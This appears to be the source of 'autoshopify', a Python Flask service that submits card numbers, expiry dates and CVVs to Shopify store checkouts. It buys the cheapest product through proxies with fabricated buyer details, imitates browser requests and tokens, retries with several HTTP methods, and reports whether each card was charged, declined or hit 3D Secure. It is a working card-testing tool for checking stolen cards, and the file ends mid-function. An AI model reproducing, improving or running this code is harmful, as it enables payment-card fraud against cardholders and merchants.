#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import subprocess
import os

def install_dependencies():
    """Automatically install required dependencies on fresh VPS"""
    print("🔍 Checking and installing dependencies...")
    
    # List of required packages
    required_packages = [
        'flask',
        'requests', 
        'beautifulsoup4',
        'brotli',
        'urllib3'
    ]
    
    # System packages (for apt-based systems)
    system_packages = [
        'python3-pip',
        'python3-dev',
        'python3-setuptools',
        'curl',
        'lsof',
        'net-tools'
    ]
    
    missing_packages = []
    
    # Check which Python packages are missing
    for package in required_packages:
        try:
            __import__(package)
            print(f"✅ {package} is already installed")
        except ImportError:
            missing_packages.append(package)
            print(f"❌ {package} is missing")
    
    # Install missing Python packages
    if missing_packages:
        print(f"\n📦 Installing missing Python packages: {', '.join(missing_packages)}")
        try:
            # Try pip3 first
            subprocess.check_call([
                sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'
            ])
            subprocess.check_call([
                sys.executable, '-m', 'pip', 'install', '--user', '--upgrade'
            ] + missing_packages)
            print("✅ Python packages installed successfully")
        except subprocess.CalledProcessError as e:
            print(f"⚠️ pip install failed, trying pip3: {e}")
            try:
                subprocess.check_call(['pip3', 'install', '--user', '--upgrade'] + missing_packages)
                print("✅ Python packages installed successfully with pip3")
            except subprocess.CalledProcessError as e:
                print(f"❌ Failed to install Python packages: {e}")
                print("Please install manually: pip3 install " + " ".join(missing_packages))
    
    # Install system packages on Linux systems
    if os.name == 'posix' and '--install-system-deps' in sys.argv:
        print("\n🐧 Installing system dependencies...")
        
        # Detect package manager
        package_managers = [
            (['apt-get', 'update'], ['apt-get', 'install', '-y'] + system_packages),
            (['yum', 'update', '-y'], ['yum', 'install', '-y'] + system_packages),
            (['dnf', 'update', '-y'], ['dnf', 'install', '-y'] + system_packages)
        ]
        
        for update_cmd, install_cmd in package_managers:
            try:
                # Check if package manager exists
                subprocess.check_call(['which', update_cmd[0]], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
                
                print(f"📋 Using {update_cmd[0]} package manager...")
                
                # Update package list
                subprocess.check_call(update_cmd, stdout=subprocess.DEVNULL)
                
                # Install packages
                subprocess.check_call(install_cmd)
                print("✅ System packages installed successfully")
                break
                
            except (subprocess.CalledProcessError, FileNotFoundError):
                continue
        else:
            print("⚠️ Could not detect package manager. Please install system dependencies manually:")
            print("Ubuntu/Debian: sudo apt-get install " + " ".join(system_packages))
            print("CentOS/RHEL: sudo yum install " + " ".join(system_packages))
    
    print("🎉 Dependency check complete!\n")

# Auto-install dependencies if this is the first run or if --install-deps flag is used
if '--install-deps' in sys.argv or '--install-system-deps' in sys.argv or not os.path.exists('.deps_installed'):
    try:
        install_dependencies()
        # Create marker file to avoid reinstalling every time
        with open('.deps_installed', 'w') as f:
            f.write('Dependencies installed successfully')
    except Exception as e:
        print(f"⚠️ Dependency installation failed: {e}")
        print("Continuing anyway... You may need to install dependencies manually.")

from flask import Flask, request, jsonify
import requests
import re
from urllib.parse import urlparse, parse_qs
import random
import string
import time
import json
import uuid
from requests.exceptions import ProxyError, ConnectTimeout
import base64
from bs4 import BeautifulSoup
import argparse
import signal
import threading
import logging
from logging.handlers import RotatingFileHandler
try:
    import brotli
except ImportError:
    print("⚠️ brotli not installed, brotli decompression will be skipped")
    brotli = None

app = Flask(__name__)

# Global variable to control server shutdown
shutdown_flag = threading.Event()

def setup_logging(daemon_mode=False):
    """Setup logging configuration"""
    if daemon_mode:
        # Create logs directory if it doesn't exist
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Setup file logging with rotation
        log_formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Main log file
        file_handler = RotatingFileHandler(
            'logs/autoshopify.log', 
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5
        )
        file_handler.setFormatter(log_formatter)
        file_handler.setLevel(logging.INFO)
        
        # Error log file
        error_handler = RotatingFileHandler(
            'logs/autoshopify_error.log',
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5
        )
        error_handler.setFormatter(log_formatter)
        error_handler.setLevel(logging.ERROR)
        
        # Configure Flask app logger
        app.logger.setLevel(logging.INFO)
        app.logger.addHandler(file_handler)
        app.logger.addHandler(error_handler)
        
        # Configure root logger
        logging.basicConfig(
            level=logging.INFO,
            handlers=[file_handler, error_handler],
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Disable console logging in daemon mode
        logging.getLogger('werkzeug').setLevel(logging.WARNING)
        
        print("Logging configured for daemon mode. Check logs/ directory for output.")
    else:
        # Console logging for normal mode
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    app.logger.info(f"Received signal {signum}. Shutting down gracefully...")
    print(f"\nReceived signal {signum}. Shutting down gracefully...")
    shutdown_flag.set()
    sys.exit(0)

def create_pid_file():
    """Create PID file for process management"""
    pid = str(os.getpid())
    with open('autoshopify.pid', 'w') as f:
        f.write(pid)
    return pid

def remove_pid_file():
    """Remove PID file on shutdown"""
    try:
        if os.path.exists('autoshopify.pid'):
            os.remove('autoshopify.pid')
    except Exception as e:
        app.logger.error(f"Error removing PID file: {e}")

def find_between(text, a, b):
    pattern = f'{re.escape(a)}(.*?){re.escape(b)}'
    match = re.search(pattern, text)
    return match.group(1) if match else ''

def getrandomaddress():
    with open('addresses.txt', 'r', encoding= 'utf-8') as lines:
        addresses = lines.readlines()
    address = random.choice(addresses).strip()
    return address


    
def create_session(proxy=None):
    session = requests.Session()
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            proxy_auth = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxies = {
                'http': proxy_auth,
                'https': proxy_auth
            }
            session.proxies.update(proxies)
        else:
            return None
    return session

def get_product_id(siteurl, session=None):
    domain = urlparse(siteurl).netloc
    try:
        if session:
            resp = session.get(siteurl)
        else:
            resp = requests.get(siteurl)
        print(resp.text)  # <-- Add this line for debugging
    except Exception:
        return None, None, None
    productid_matches = re.findall(r'"variantId":(\d+)', resp.text)
    productid1_matches = re.findall(r'"productId":(\d+)', resp.text)
    if not productid_matches or not productid1_matches:
        return None, None, None
    productid = int(productid_matches[0])
    productid1 = int(productid1_matches[0])
    return domain, productid, productid1

def get_minimum_price_product_details(products_json):
    """Find the product with minimum price from products.json"""
    try:
        data = json.loads(products_json)
        if 'products' not in data:
            raise Exception('Invalid JSON format or missing products key')
        
        min_price = None
        min_price_details = {
            'id': None,
            'variant_id': None,
            'price': None,
            'title': None,
        }
        
        for product in data['products']:
            for variant in product['variants']:
                price = float(variant['price'])
                # Skip prices below 0.01 (including 0.00)
                if price >= 0.01:
                    # If minPrice is null or the current price is lower than minPrice, update min_price_details
                    if min_price is None or price < min_price:
                        min_price = price
                        min_price_details = {
                            'id': variant['id'],  # This is the variant ID
                            'product_id': product['id'],  # This is the product ID  
                            'variant_id': variant['id'],  # Also store as variant_id for compatibility
                            'price': variant['price'],
                            'title': product['title'],
                        }
        
        # If no valid price was found, return an error message
        if min_price is None:
            raise Exception('No products found with price greater than or equal to 0.01')
        
        print(f"🛍️ Selected product: {min_price_details['title']}")
        print(f"💰 Price: ${min_price_details['price']}")
        print(f"🆔 Product ID: {min_price_details['product_id']}")
        print(f"🔢 Variant ID: {min_price_details['variant_id']}")
        
        return min_price_details
    except Exception as e:
        print(f"Error in get_minimum_price_product_details: {e}")
        return None

def get_storefront_access_token(domain, session=None):
    """Extract storefront access token from the site"""
    try:
        if session:
            resp = session.get(f'https://{domain}')
        else:
            resp = requests.get(f'https://{domain}')
        
        # Look for storefront access token in various patterns
        patterns = [
            r'window\.Shopify\.Storefront\.accessToken\s*=\s*["\']([^"\']+)["\']',
            r'storefront_access_token["\']:\s*["\']([^"\']+)["\']',
            r'"accessToken":\s*"([^"]+)"',
            r'storefrontAccessToken["\']:\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, resp.text)
            if match:
                return match.group(1)
        
        return None
    except Exception as e:
        print(f"Error getting storefront token: {e}")
        return None

def get_address_data():
    """Get realistic address data"""
    try:
        # Try mockaroo API first
        mockaroo_url = "https://my.api.mockaroo.com/united_states.json?key=68afec30"
        resp = requests.get(mockaroo_url, timeout=5)
        if resp.status_code == 200:
            mock_data = resp.json()
            return {
                'first_name': mock_data.get("first", "John"),
                'last_name': mock_data.get("last", "Doe"),
                'email': mock_data.get("email", "john.doe@example.com"),
                'phone': mock_data.get("phone", "+1234567890"),
                'address1': mock_data.get("street", "1535 Broadway"),
                'city': mock_data.get("city", "NEW YORK"),
                'province': mock_data.get("state2", "NY"),
                'zip': mock_data.get("zip", "10036"),
                'country': "US"
            }
    except:
        pass
    
    # Fallback to default values with proper email format
    import random
    random_id = random.randint(1000, 9999)
    return {
        'first_name': "John",
        'last_name': "Doe", 
        'email': f"testuser{random_id}@example.com",
        'phone': "+1234567890",
        'address1': "1535 Broadway",
        'city': "NEW YORK",
        'province': "NY",
        'zip': "10036",
        'country': "US"
    }

def attempt_direct_form_submission(checkout_url, cc, mes, ano, cvv, address_data, session):
    """Direct form submission approach - mimics exact browser behavior"""
    print("🎯 DIRECT FORM SUBMISSION CALLED - Starting now...")
    try:
        print(f"🎯 Trying direct form submission: {checkout_url}")
        
        from urllib.parse import urlparse
        parsed_url = urlparse(checkout_url)
        domain = parsed_url.netloc
        base_url = f"https://{domain}"
        
        # Extract checkout token from URL
        checkout_token = ""
        if '/cn/' in checkout_url:
            checkout_token = checkout_url.split('/cn/')[1].split('?')[0]
            print(f"✅ Checkout token: {checkout_token[:20]}...")
        
        # Step 1: Load checkout page first to get authenticity token and form details
        print("📄 Loading checkout page to extract form data...")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': f"{base_url}/",
        }
        
        page_resp = session.get(checkout_url, headers=headers)
        if page_resp.status_code != 200:
            print(f"❌ Could not load checkout page: {page_resp.status_code}")
            return {'result': 'UNKNOWN', 'message': f'Checkout page load failed: {page_resp.status_code}'}
        
        page_content = page_resp.text
        print(f"✅ Loaded checkout page ({len(page_content)} chars)")
        
        # Extract authenticity token
        auth_token = None
        auth_patterns = [
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*value=["\']([^"\']*)["\']',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']*)["\']',
            r'"authenticity_token":"([^"]+)"',
            r'authenticity_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in auth_patterns:
            matches = re.findall(pattern, page_content, re.IGNORECASE)
            if matches:
                auth_token = matches[0]
                print(f"✅ Found authenticity token: {auth_token[:20]}...")
                break
        
        if not auth_token:
            print("⚠️ No authenticity token found")
        
        # Extract other hidden fields
        hidden_fields = {}
        hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
        for name, value in re.findall(hidden_pattern, page_content, re.IGNORECASE):
            if name not in ['authenticity_token']:  # Don't override if we found a better one
                hidden_fields[name] = value
                print(f"🔍 Hidden field: {name} = {value[:20]}...")
        
        # Step 2: Try the PHP script approach - direct submission to checkout token endpoint
        if checkout_token:
            print(f"💳 Trying PHP-style direct submission to checkout token endpoint...")
            
            # Construct the payment submission URL like the PHP script
            payment_url = f"{base_url}/checkouts/{checkout_token}"
            
            # Create form data matching PHP script
            form_data = {
                'checkout[email]': address_data['email'],
                'checkout[shipping_address][first_name]': address_data['first_name'],
                'checkout[shipping_address][last_name]': address_data['last_name'],
                'checkout[shipping_address][address1]': address_data['address1'],
                'checkout[shipping_address][city]': address_data['city'],
                'checkout[shipping_address][province]': address_data['province'],
                'checkout[shipping_address][zip]': address_data['zip'],
                'checkout[shipping_address][country]': address_data['country'],
                'checkout[shipping_address][phone]': address_data['phone'],
                'checkout[billing_address][first_name]': address_data['first_name'],
                'checkout[billing_address][last_name]': address_data['last_name'],
                'checkout[billing_address][address1]': address_data['address1'],
                'checkout[billing_address][city]': address_data['city'],
                'checkout[billing_address][province]': address_data['province'],
                'checkout[billing_address][zip]': address_data['zip'],
                'checkout[billing_address][country]': address_data['country'],
                'checkout[billing_address][phone]': address_data['phone'],
                'checkout[credit_card][number]': cc,
                'checkout[credit_card][month]': mes,
                'checkout[credit_card][year]': ano,
                'checkout[credit_card][verification_value]': cvv,
                'checkout[credit_card][name]': f"{address_data['first_name']} {address_data['last_name']}",
                'checkout[different_billing_address]': 'false',
                'checkout[remember_me]': 'false',
                'checkout[buyer_accepts_marketing]': 'false',
                'utf8': '✓',
                'step': 'payment_method',
                'previous_step': 'contact_information',
                '_method': 'patch',
                'commit': 'Complete order',
            }
            
            # Add authenticity token if found
            if auth_token:
                form_data['authenticity_token'] = auth_token
            
            # Add all hidden fields
            form_data.update(hidden_fields)
            
            submit_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': checkout_url,
                'Cache-Control': 'max-age=0',
            }
            
            print(f"📋 Submitting to: {payment_url}")
            print(f"💳 Form data fields: {len(form_data)}")
            
            # Try multiple HTTP methods
            for method in ['POST', 'PATCH']:
                try:
                    method_headers = submit_headers.copy()
                    if method == 'PATCH':
                        method_headers['X-HTTP-Method-Override'] = 'PATCH'
                    
                    if method == 'POST':
                        resp = session.post(payment_url, data=form_data, headers=method_headers, allow_redirects=True, timeout=30)
                    else:
                        resp = session.patch(payment_url, data=form_data, headers=method_headers, allow_redirects=True, timeout=30)
                    
                    print(f"📋 {method} response: {resp.status_code}")
                    print(f"🔗 Final URL: {resp.url}")
                    
                    if resp.status_code in [200, 302, 303]:
                        # Analyze response
                        try:
                            response_content = resp.text.lower()
                        except:
                            response_content = str(resp.content).lower()
                        
                        final_url = resp.url.lower()
                        
                        # Success indicators
                        success_patterns = ['/thank_you', '/thank-you', '/orders/', '/receipt', '/success', 'thank you for your order', 'order confirmation', 'payment successful', 'order complete']
                        if any(pattern in final_url for pattern in success_patterns) or any(pattern in response_content for pattern in success_patterns):
                            return {'result': 'CHARGED', 'message': f'Payment successful via direct {method}'}
                        
                        # Decline indicators  
                        decline_patterns = ['card was declined', 'payment failed', 'declined', 'invalid card', 'insufficient funds', 'card not supported', 'transaction declined']
                        if any(pattern in response_content for pattern in decline_patterns):
                            return {'result': 'DECLINED', 'message': f'Card declined via direct {method}'}
                        
                        # 3DS indicators
                        threeds_patterns = ['3d secure', '3ds', 'additional verification', 'authentication required', 'verify your card']
                        if any(pattern in response_content for pattern in threeds_patterns):
                            return {'result': '3DS', 'message': f'3D Secure required via direct {method}'}
                        
                        # Check for form errors
                        error_patterns = ['error', 'invalid', 'required', 'missing']
                        if any(pattern in response_content for pattern in error_patterns):
                            print(f"⚠️ Found error indicators in {method} response")
                            continue  # Try next method
                    
                    elif resp.status_code == 422:
                        print(f"❌ {method} returned 422 - likely validation error")
                        continue
                    
                except Exception as e:
                    print(f"❌ {method} failed: {e}")
                    continue
        
        # If direct submission didn't work, return UNKNOWN to try other methods
        print("🔄 Direct form submission inconclusive - trying other methods")
        return {'result': 'UNKNOWN', 'message': 'Direct form submission inconclusive'}
        
    except Exception as e:
        print(f"💥 Direct form submission error: {str(e)}")
        return {'result': 'UNKNOWN', 'message': f'Direct form submission failed: {str(e)}'}

def attempt_simple_checkout(checkout_url, cc, mes, ano, cvv, address_data, session):
    """Simple checkout approach when GraphQL method fails"""
    try:
        print(f"🔄 Trying simple checkout approach: {checkout_url}")
        
        from urllib.parse import urlparse
        parsed_url = urlparse(checkout_url)
        domain = parsed_url.netloc
        base_url = f"https://{domain}"
        
        # Headers for requests
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Referer': checkout_url,
        }
        
        # Step 1: Load checkout page
        resp = session.get(checkout_url, headers=headers)
        if resp.status_code != 200:
            print(f"❌ Checkout page failed with status: {resp.status_code} - returning UNKNOWN to try GraphQL fallback")
            return {'result': 'UNKNOWN', 'message': f'Checkout page failed: {resp.status_code} - trying GraphQL fallback'}
        
        page_content = resp.text
        
        # Step 2: Look for form action URL
        form_action = None
        form_patterns = [
            r'<form[^>]*action="([^"]*checkout[^"]*)"',
            r'<form[^>]*action="([^"]*payment[^"]*)"',
            r'action="([^"]*)"[^>]*checkout',
        ]
        
        for pattern in form_patterns:
            matches = re.findall(pattern, page_content, re.IGNORECASE)
            if matches:
                form_action = matches[0]
                if not form_action.startswith('http'):
                    form_action = base_url + form_action
                break
        
        if not form_action:
            # Try different Shopify checkout endpoints
            checkout_token = checkout_url.split('/cn/')[-1].split('?')[0] if '/cn/' in checkout_url else ''
            possible_actions = [
                f"{base_url}/checkouts/{checkout_token}",
                f"{base_url}/checkout",
                f"{base_url}/cart",
                checkout_url,  # Use the checkout URL directly
            ]
            
            for action in possible_actions:
                print(f"🔍 Testing form action: {action}")
                test_resp = session.head(action, headers={'User-Agent': headers['User-Agent']})
                if test_resp.status_code not in [404, 405]:  # Not found or method not allowed
                    form_action = action
                    print(f"✅ Found valid form action: {form_action}")
                    break
            
            if not form_action:
                form_action = checkout_url  # Last resort
        
        print(f"📋 Using form action: {form_action}")
        
        # Step 3: Extract any hidden fields
        hidden_fields = {}
        hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
        hidden_matches = re.findall(hidden_pattern, page_content, re.IGNORECASE)
        
        for name, value in hidden_matches:
            hidden_fields[name] = value
            print(f"🔍 Found hidden field: {name} = {value[:20]}...")
        
        # Step 4: Create payment payload
        payment_data = {
            # Basic checkout fields
            'checkout[email]': address_data['email'],
            'checkout[shipping_address][first_name]': address_data['first_name'],
            'checkout[shipping_address][last_name]': address_data['last_name'],
            'checkout[shipping_address][address1]': address_data['address1'],
            'checkout[shipping_address][city]': address_data['city'],
            'checkout[shipping_address][province]': address_data['province'],
            'checkout[shipping_address][zip]': address_data['zip'],
            'checkout[shipping_address][country]': address_data['country'],
            'checkout[shipping_address][phone]': address_data['phone'],
            
            # Billing same as shipping
            'checkout[billing_address][first_name]': address_data['first_name'],
            'checkout[billing_address][last_name]': address_data['last_name'],
            'checkout[billing_address][address1]': address_data['address1'],
            'checkout[billing_address][city]': address_data['city'],
            'checkout[billing_address][province]': address_data['province'],
            'checkout[billing_address][zip]': address_data['zip'],
            'checkout[billing_address][country]': address_data['country'],
            'checkout[billing_address][phone]': address_data['phone'],
            
            # Payment fields
            'checkout[payment_gateway]': 'credit_card',
            'checkout[credit_card][number]': cc,
            'checkout[credit_card][month]': mes,
            'checkout[credit_card][year]': ano,
            'checkout[credit_card][verification_value]': cvv,
            'checkout[credit_card][name]': f"{address_data['first_name']} {address_data['last_name']}",
            
            # Common form fields
            'button': '',
            'utf8': '✓',
            'commit': 'Complete order',
            '_method': 'patch',
        }
        
        # Add hidden fields
        payment_data.update(hidden_fields)
        
        # Try Shopify-specific payment completion first
        checkout_token = checkout_url.split('/cn/')[-1].split('?')[0] if '/cn/' in checkout_url else ''
        if checkout_token:
            print(f"🎯 Trying Shopify completion API for token: {checkout_token[:20]}...")
            
            # Method A: Use /complete endpoint
            complete_url = f"{base_url}/checkouts/{checkout_token}/complete"
            complete_headers = headers.copy()
            complete_headers['Content-Type'] = 'application/json'
            
            complete_payload = {
                "payment": {
                    "credit_card": {
                        "number": cc,
                        "month": int(mes),
                        "year": int(ano),
                        "verification_value": cvv,
                        "name": f"{address_data['first_name']} {address_data['last_name']}"
                    },
                    "billing_address": {
                        "first_name": address_data['first_name'],
                        "last_name": address_data['last_name'],
                        "address1": address_data['address1'],
                        "city": address_data['city'],
                        "province": address_data['province'],
                        "zip": address_data['zip'],
                        "country": address_data['country'],
                        "phone": address_data['phone']
                    }
                }
            }
            
            try:
                complete_resp = session.post(
                    complete_url,
                    json=complete_payload,
                    headers=complete_headers,
                    timeout=30
                )
                
                print(f"📋 Complete API response: {complete_resp.status_code}")
                
                if complete_resp.status_code == 200:
                    try:
                        complete_data = complete_resp.json()
                        if complete_data.get('success') or 'thank_you' in complete_resp.url:
                            return {'result': 'CHARGED', 'message': 'Payment successful via Shopify complete API'}
                    except:
                        pass
                        
                # If complete API worked but didn't indicate success/failure clearly
                if complete_resp.status_code in [200, 302]:
                    response_text = complete_resp.text.lower()
                    if any(indicator in response_text for indicator in ['thank you', 'order confirmation', 'receipt']):
                        return {'result': 'CHARGED', 'message': 'Payment successful via complete API'}
                    elif any(indicator in response_text for indicator in ['declined', 'failed', 'error']):
                        return {'result': 'DECLINED', 'message': 'Card declined via complete API'}
                        
            except Exception as e:
                print(f"⚠️ Complete API failed: {e}")
        
        print(f"💳 Submitting payment with {len(payment_data)} fields...")
        
        # Step 5: Submit payment - try multiple methods
        payment_resp = None
        
        # Method 1: Try POST to form action
        try:
            payment_resp = session.post(
                form_action,
                data=payment_data,
                headers=headers,
                allow_redirects=True,
                timeout=30
            )
            print(f"📋 POST Payment response: {payment_resp.status_code}")
        except Exception as e:
            print(f"❌ POST method failed: {e}")
        
        # Method 2: If POST failed, try PATCH (common for Shopify)
        if not payment_resp or payment_resp.status_code >= 400:
            try:
                patch_headers = headers.copy()
                patch_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                patch_headers['X-HTTP-Method-Override'] = 'PATCH'
                
                payment_resp = session.post(
                    form_action,
                    data=payment_data,
                    headers=patch_headers,
                    allow_redirects=True,
                    timeout=30
                )
                print(f"📋 PATCH Payment response: {payment_resp.status_code}")
            except Exception as e:
                print(f"❌ PATCH method failed: {e}")
        
        # Method 3: If both failed, try PUT
        if not payment_resp or payment_resp.status_code >= 400:
            try:
                payment_resp = session.put(
                    form_action,
                    data=payment_data,
                    headers=headers,
                    allow_redirects=True,
                    timeout=30
                )
                print(f"📋 PUT Payment response: {payment_resp.status_code}")
            except Exception as e:
                print(f"❌ PUT method failed: {e}")
        
        if not payment_resp:
            print("❌ All payment submission methods failed, returning UNKNOWN to try GraphQL fallback")
            return {'result': 'UNKNOWN', 'message': 'All payment submission methods failed - trying GraphQL fallback'}
        
        # Step 6: Analyze response with better content handling
        try:
            # Try to decode the response content properly
            response_content = payment_resp.text.lower()
            
            # If content appears to be compressed/garbled, try to decode it
            if len(response_content) > 0 and response_content[0] in ['\x1f', '\x8b', '\x78']:
                try:
                    import gzip
                    import io
                    response_content = gzip.decompress(payment_resp.content).decode('utf-8').lower()
                    print("✅ Successfully decompressed response content")
                except:
                    # If decompression fails, use the raw content
                    print("⚠️ Could not decompress response, using raw content")
                    
        except Exception as e:
            print(f"⚠️ Error processing response content: {e}")
            response_content = str(payment_resp.content).lower()
        
        print(f"📋 Final response status: {payment_resp.status_code}")
        
        # Check for success indicators
        success_indicators = [
            'thank you for your order',
            'order confirmation',
            'payment successful',
            'order complete',
            'receipt',
            'order #',
            'order number',
            '/thank_you',
            '/orders/',
            'your order has been received',
            'payment has been processed',
            'transaction successful',
            'purchase complete',
            'order confirmed',
            'thank-you',
            'success',
            'completed successfully',
            'payment accepted',
            'order placed successfully',
        ]
        
        for indicator in success_indicators:
            if indicator in response_content:
                print(f"✅ Found success indicator: {indicator}")
                return {'result': 'CHARGED', 'message': 'Payment successful via simple checkout'}
        
        # Check for decline indicators
        decline_indicators = [
            'card was declined',
            'payment failed',
            'invalid card',
            'card number is invalid',
            'expired',
            'insufficient funds',
            'card not supported',
            'transaction declined',
            'payment could not be processed',
            'declined',
            'card declined',
            'transaction failed',
            'payment not successful',
            'unable to process payment',
            'card cannot be used',
            'invalid payment',
            'payment error',
            'authorization failed',
            'card not accepted',
            'payment rejected',
        ]
        
        for indicator in decline_indicators:
            if indicator in response_content:
                print(f"❌ Found decline indicator: {indicator}")
                return {'result': 'DECLINED', 'message': f'Card declined: {indicator}'}
        
        # Check for specific Shopify error patterns
        shopify_error_patterns = [
            r'data-error[^>]*>([^<]+)',
            r'class="error"[^>]*>([^<]+)',
            r'error[_-]message[^>]*>([^<]+)',
            r'"error":\s*"([^"]+)"',
            r'"message":\s*"([^"]+error[^"]*)"',
        ]
        
        for pattern in shopify_error_patterns:
            matches = re.findall(pattern, response_content, re.IGNORECASE)
            if matches:
                error_msg = matches[0].strip().lower()
                if any(decline_word in error_msg for decline_word in ['decline', 'fail', 'invalid', 'error']):
                    return {'result': 'DECLINED', 'message': f'Shopify error: {error_msg}'}
        
        # Check for 3D Secure or additional verification
        threeds_indicators = [
            '3d secure',
            '3ds',
            'additional verification',
            'verify your card',
            'authentication required',
            'confirm your payment',
            'redirect_required',
            'action_required',
        ]
        
        for indicator in threeds_indicators:
            if indicator in response_content:
                print(f"🔐 Found 3DS indicator: {indicator}")
                return {'result': '3DS', 'message': f'3D Secure required: {indicator}'}
        
        # Check for processing/pending indicators
        processing_indicators = [
            'processing payment',
            'please wait',
            'processing your order',
            'verifying payment',
            'payment pending',
        ]
        
        for indicator in processing_indicators:
            if indicator in response_content:
                print(f"⏳ Found processing indicator: {indicator}")
                return {'result': 'PROCESSING', 'message': f'Payment processing: {indicator}'}
        
        # Check for error indicators
        error_indicators = [
            'error',
            'unable to process',
            'try again',
            'system error',
            'unavailable',
            'temporarily unavailable',
            'service unavailable',
            'maintenance',
        ]
        
        for indicator in error_indicators:
            if indicator in response_content:
                print(f"⚠️ Found error indicator: {indicator} - returning UNKNOWN to try GraphQL fallback")
                return {'result': 'UNKNOWN', 'message': f'Checkout error: {indicator} - trying GraphQL fallback'}
        
        # If final URL contains success patterns
        final_url = payment_resp.url.lower()
        if any(pattern in final_url for pattern in ['/thank_you', '/orders/', '/receipt', '/success']):
            return {'result': 'CHARGED', 'message': 'Payment successful - redirected to success page'}
        
        # Check for typical failure URLs
        if any(pattern in final_url for pattern in ['/failed', '/error', '/decline']):
            return {'result': 'DECLINED', 'message': 'Payment failed - redirected to failure page'}
        
        # Default: unknown response
        print(f"❓ Unknown response - URL: {payment_resp.url}")
        print(f"❓ Response snippet: {response_content[:200]}...")
        
        return {'result': 'UNKNOWN', 'message': 'Unable to determine payment result'}
        
    except Exception as e:
        print(f"💥 Simple checkout error: {str(e)}")
        return {'result': 'ERROR', 'message': f'Simple checkout failed: {str(e)}'}

def attempt_checkout_payment(checkout_url, cc, mes, ano, cvv, address_data, session, product_details):
    """Use Shopify GraphQL checkout API like the working PHP script"""
    try:
        print(f"🚀 Using GraphQL checkout API approach: {checkout_url}")
        
        # Extract domain for payment processing
        from urllib.parse import urlparse
        parsed_url = urlparse(checkout_url)
        domain = parsed_url.netloc
        base_url = f"https://{domain}"
        
        # Headers for all requests
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Step 1: Basic card validation
        def luhn_check(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d*2))
            return checksum % 10 == 0
        
        if not luhn_check(cc):
            return {'result': 'DECLINED', 'message': 'Invalid card number'}
        
        # Step 2: Load checkout page and extract required tokens
        print("📥 Loading checkout page to extract tokens...")
        checkout_resp = session.get(checkout_url, headers=headers, allow_redirects=True)
        
        if checkout_resp.status_code != 200:
            return {'result': 'ERROR', 'message': f'Checkout page failed: {checkout_resp.status_code}'}
        
        # FIXED: Proper response decompression like PHP curl_exec handles automatically
        def decompress_response(response):
            """Properly decompress response content"""
            raw_content = response.content
            
            # Get encoding from headers
            content_encoding = response.headers.get('content-encoding', '').lower()
            
            try:
                if 'gzip' in content_encoding:
                    import gzip
                    page_content = gzip.decompress(raw_content).decode('utf-8')
                    print("✅ Successfully decompressed gzipped content")
                elif 'deflate' in content_encoding:
                    import zlib
                    page_content = zlib.decompress(raw_content).decode('utf-8')
                    print("✅ Successfully decompressed deflate content")
                elif 'br' in content_encoding:
                    if brotli:
                        page_content = brotli.decompress(raw_content).decode('utf-8')
                        print("✅ Successfully decompressed brotli content")
                    else:
                        print("⚠️ Brotli compression detected but brotli not available, trying raw decode")
                        page_content = raw_content.decode('utf-8')
                else:
                    # Try to decode as regular text
                    page_content = raw_content.decode('utf-8')
                    print("✅ Using raw content (no compression)")
                
                # Verify content looks like HTML
